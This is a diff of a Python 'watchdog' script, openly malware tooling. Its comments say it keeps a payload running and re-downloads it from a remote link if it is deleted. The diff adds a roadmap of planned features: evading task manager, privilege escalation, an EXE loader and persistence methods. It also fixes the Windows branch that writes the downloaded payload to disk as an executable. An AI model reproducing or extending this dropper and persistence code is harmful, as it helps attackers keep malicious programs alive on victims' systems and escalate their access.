@@ -7,6 +7,32 @@ import requests
 import shutil
 import getpass
 
+### The purpose of this watchdog is to make sure that the payload is always running.
+#   If the pay load is not running and is not on the file system because it got deleated 
+#   or somehow, watchdog will redownload and place the payload in the specified directory.
+#   
+# 
+#   
+# 
+#   FEATURES TO ADD:
+#   ________________
+#   Macos support
+#
+#   Stub creator
+#
+#   GUI
+#
+#   Auto-Detect taskmanager and remove self until it is closed.
+#
+#   Privilege Escaltion
+#   
+#   EXE LOADER and executer
+#
+#   Launch python script on the fly
+#
+#   different persistance methods
+#
+
 
 OS = platform.uname()[0]
 
@@ -110,7 +136,7 @@ while 1:
                 r = requests.get(_PAYLOAD_LINK)
                 if OS == "Linux":
                     file = open("./{0}".format(_PAYLOAD_NAME), 'wb')
-                elif OS == "Winwos":
+                elif OS == "Windows":
                     file = open("./{0}.exe".format(_PAYLOAD_NAME), 'wb')
                     
                 file.write(r.content)
@@ -120,4 +146,3 @@ while 1:
                 continue
                 
             
-
